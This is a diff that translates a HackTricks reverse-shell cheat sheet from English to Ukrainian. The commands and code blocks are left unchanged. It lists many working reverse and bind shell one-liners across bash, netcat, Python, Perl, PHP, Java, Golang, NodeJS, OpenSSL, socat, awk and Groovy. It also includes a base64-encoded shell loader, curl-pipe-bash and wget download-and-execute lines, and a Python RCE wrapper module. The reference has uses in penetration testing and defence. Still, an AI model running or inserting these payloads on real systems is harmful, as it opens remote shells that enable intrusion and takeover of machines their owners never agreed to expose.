@@ -2,14 +2,13 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**If you have questions about any of these shells you could check them with** [**https://explainshell.com/**](https://explainshell.com)
+**Якщо у вас є питання щодо будь-якої з цих оболонок, ви можете перевірити їх на** [**https://explainshell.com/**](https://explainshell.com)
 
 ## Full TTY
 
-**Once you get a reverse shell**[ **read this page to obtain a full TTY**](full-ttys.md)**.**
+**Як тільки ви отримаєте зворотну оболонку**[ **прочитайте цю сторінку, щоб отримати повний TTY**](full-ttys.md)**.**
 
 ## Bash | sh
-
 ```bash
 curl https://reverse-shell.sh/1.1.1.1:3000 | bash
 bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
@@ -22,11 +21,9 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
+Не забудьте перевірити з іншими оболонками: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh та bash.
 
-Don't forget to check with other shells: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, and bash.
-
-### Symbol safe shell
-
+### Символічно безпечна оболонка
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -35,74 +32,66 @@ bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
 #B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
 echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
 ```
+#### Пояснення оболонки
 
-#### Shell explanation
+1. **`bash -i`**: Ця частина команди запускає інтерактивну (`-i`) оболонку Bash.
+2. **`>&`**: Ця частина команди є скороченою нотацією для **перенаправлення як стандартного виходу** (`stdout`), так і **стандартної помилки** (`stderr`) до **одного і того ж місця призначення**.
+3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Це спеціальний файл, який **представляє TCP-з'єднання з вказаною IP-адресою та портом**.
+- Перенаправляючи вихідні та помилкові потоки до цього файлу, команда ефективно надсилає вихід інтерактивної сесії оболонки на машину атакуючого.
+4. **`0>&1`**: Ця частина команди **перенаправляє стандартний вхід (`stdin`) до того ж місця призначення, що й стандартний вихід (`stdout`)**.
 
-1. **`bash -i`**: This part of the command starts an interactive (`-i`) Bash shell.
-2. **`>&`**: This part of the command is a shorthand notation for **redirecting both standard output** (`stdout`) and **standard error** (`stderr`) to the **same destination**.
-3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: This is a special file that **represents a TCP connection to the specified IP address and port**.
-   - By **redirecting the output and error streams to this file**, the command effectively sends the output of the interactive shell session to the attacker's machine.
-4. **`0>&1`**: This part of the command **redirects standard input (`stdin`) to the same destination as standard output (`stdout`)**.
-
-### Create in file and execute
-
+### Створити у файлі та виконати
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
 ```
-
 ## Forward Shell
 
-When dealing with a **Remote Code Execution (RCE)** vulnerability within a Linux-based web application, achieving a reverse shell might be obstructed by network defenses like iptables rules or intricate packet filtering mechanisms. In such constrained environments, an alternative approach involves establishing a PTY (Pseudo Terminal) shell to interact with the compromised system more effectively.
+Коли ви маєте справу з вразливістю **Remote Code Execution (RCE)** в веб-додатку на базі Linux, досягнення зворотного шеллу може бути ускладнене мережевими захистами, такими як правила iptables або складні механізми фільтрації пакетів. У таких обмежених середовищах альтернативний підхід полягає в створенні PTY (Pseudo Terminal) шеллу для більш ефективної взаємодії з скомпрометованою системою.
 
-A recommended tool for this purpose is [toboggan](https://github.com/n3rada/toboggan.git), which simplifies interaction with the target environment.
+Рекомендований інструмент для цієї мети - [toboggan](https://github.com/n3rada/toboggan.git), який спрощує взаємодію з цільовим середовищем.
 
-To utilize toboggan effectively, create a Python module tailored to the RCE context of your target system. For example, a module named `nix.py` could be structured as follows:
-
+Щоб ефективно використовувати toboggan, створіть модуль Python, адаптований до контексту RCE вашої цільової системи. Наприклад, модуль з назвою `nix.py` може бути структурований наступним чином:
 ```python3
 import jwt
 import httpx
 
 def execute(command: str, timeout: float = None) -> str:
-    # Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
-    token = jwt.encode(
-        {"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
-    )
+# Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
+token = jwt.encode(
+{"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
+)
 
-    response = httpx.get(
-        url="https://vulnerable.io:3200",
-        headers={"Authorization": f"Bearer {token}"},
-        timeout=timeout,
-        # ||BURP||
-        verify=False,
-    )
+response = httpx.get(
+url="https://vulnerable.io:3200",
+headers={"Authorization": f"Bearer {token}"},
+timeout=timeout,
+# ||BURP||
+verify=False,
+)
 
-    # Check if the request was successful
-    response.raise_for_status()
+# Check if the request was successful
+response.raise_for_status()
 
-    return response.text
+return response.text
 ```
-
-And then, you can run:
-
+А потім ви можете виконати:
 ```shell
 toboggan -m nix.py -i
 ```
+Щоб безпосередньо використовувати інтерактивну оболонку. Ви можете додати `-b` для інтеграції з Burpsuite і видалити `-i` для більш базового обгортки rce.
 
-To directly leverage an interractive shell. You can add `-b` for Burpsuite integration and remove the `-i` for a more basic rce wrapper.
+Ще одна можливість полягає у використанні реалізації `IppSec` для пересилання оболонки [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
-Another possibility consist using the `IppSec` forward shell implementation [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
+Вам просто потрібно змінити:
 
-You just need to modify:
+- URL вразливого хоста
+- Префікс і суфікс вашого корисного навантаження (якщо є)
+- Спосіб відправки корисного навантаження (заголовки? дані? додаткова інформація?)
 
-- The URL of the vulnerable host
-- The prefix and suffix of your payload (if any)
-- The way the payload is sent (headers? data? extra info?)
-
-Then, you can just **send commands** or even **use the `upgrade` command** to get a full PTY (note that pipes are read and written with an approximate 1.3s delay).
+Тоді ви можете просто **надсилати команди** або навіть **використовувати команду `upgrade`** для отримання повного PTY (зауважте, що канали читаються і записуються з приблизною затримкою 1,3 с).
 
 ## Netcat
-
 ```bash
 nc -e /bin/sh <ATTACKER-IP> <PORT>
 nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
@@ -110,42 +99,32 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp
 nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
 rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
 ```
-
 ## gsocket
 
-Check it in [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
-
+Перевірте це на [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
 ```bash
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
-
 ## Telnet
-
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
 telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
 rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
 ```
-
 ## Whois
 
-**Attacker**
-
+**Атакуючий**
 ```bash
 while true; do nc -l <port>; done
 ```
+Щоб надіслати команду, напишіть її, натисніть Enter і натисніть CTRL+D (щоб зупинити STDIN)
 
-To send the command write it down, press enter and press CTRL+D (to stop STDIN)
-
-**Victim**
-
+**Жертва**
 ```bash
 export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
 ```
-
 ## Python
-
 ```bash
 #Linux
 export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
@@ -153,23 +132,17 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 #IPv6
 python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
 ```
-
 ## Perl
-
 ```bash
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
-
-## Ruby
-
+## Рубі
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
-
 ## PHP
-
 ```php
 // Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
 // Using this method may lead to instances where the connection reaches out to the listener and then closes.
@@ -181,51 +154,41 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 <?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
 ```
-
 ## Java
-
 ```bash
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 ```
-
 ## Ncat
-
 ```bash
 victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
 attacker> ncat -l <port,eg.443> --ssl
 ```
-
 ## Golang
-
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
-
 ## Lua
-
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
 #Windows & Linux
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
-
 ## NodeJS
-
 ```javascript
 (function(){
-    var net = require("net"),
-        cp = require("child_process"),
-        sh = cp.spawn("/bin/sh", []);
-    var client = new net.Socket();
-    client.connect(8080, "10.17.26.64", function(){
-        client.pipe(sh.stdin);
-        sh.stdout.pipe(client);
-        sh.stderr.pipe(client);
-    });
-    return /a/; // Prevents the Node.js application form crashing
+var net = require("net"),
+cp = require("child_process"),
+sh = cp.spawn("/bin/sh", []);
+var client = new net.Socket();
+client.connect(8080, "10.17.26.64", function(){
+client.pipe(sh.stdin);
+sh.stdout.pipe(client);
+sh.stderr.pipe(client);
+});
+return /a/; // Prevents the Node.js application form crashing
 })();
 
 
@@ -256,19 +219,15 @@ or
 
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
-
 ## OpenSSL
 
-The Attacker (Kali)
-
+Атакуючий (Kali)
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
 ```
-
-The Victim
-
+Жертва
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -276,103 +235,84 @@ openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_clien
 #Windows
 openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
 ```
-
 ## **Socat**
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-### Bind shell
-
+### Прив'язаний шелл
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
 ```
-
-### Reverse shell
-
+### Зворотний шелл
 ```bash
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
-
 ## Awk
-
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
-
 ## Finger
 
-**Attacker**
-
+**Атакуючий**
 ```bash
 while true; do nc -l 79; done
 ```
+Щоб надіслати команду, напишіть її, натисніть Enter і натисніть CTRL+D (щоб зупинити STDIN)
 
-To send the command write it down, press enter and press CTRL+D (to stop STDIN)
-
-**Victim**
-
+**Жертва**
 ```bash
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done
 
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
 ```
-
 ## Gawk
-
 ```bash
 #!/usr/bin/gawk -f
 
 BEGIN {
-        Port    =       8080
-        Prompt  =       "bkd> "
+Port    =       8080
+Prompt  =       "bkd> "
 
-        Service = "/inet/tcp/" Port "/0/0"
-        while (1) {
-                do {
-                        printf Prompt |& Service
-                        Service |& getline cmd
-                        if (cmd) {
-                                while ((cmd |& getline) > 0)
-                                        print $0 |& Service
-                                close(cmd)
-                        }
-                } while (cmd != "exit")
-                close(Service)
-        }
+Service = "/inet/tcp/" Port "/0/0"
+while (1) {
+do {
+printf Prompt |& Service
+Service |& getline cmd
+if (cmd) {
+while ((cmd |& getline) > 0)
+print $0 |& Service
+close(cmd)
+}
+} while (cmd != "exit")
+close(Service)
+}
 }
 ```
-
 ## Xterm
 
-This will try to connect to your system at port 6001:
-
+Це спробує підключитися до вашої системи на порту 6001:
 ```bash
 xterm -display 10.0.0.1:1
 ```
-
-To catch the reverse shell you can use (which will listen in port 6001):
-
+Щоб зловити зворотний шелл, ви можете використовувати (який буде слухати на порту 6001):
 ```bash
 # Authorize host
 xhost +targetip
 # Listen
 Xnest :1
 ```
-
 ## Groovy
 
-by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTE: Java reverse shell also work for Groovy
-
+by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) ЗАУВАЖЕННЯ: Java reverse shell також працює для Groovy
 ```bash
 String host="localhost";
 int port=8044;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
-
-## References
+## Посилання
 
 - [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 - [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
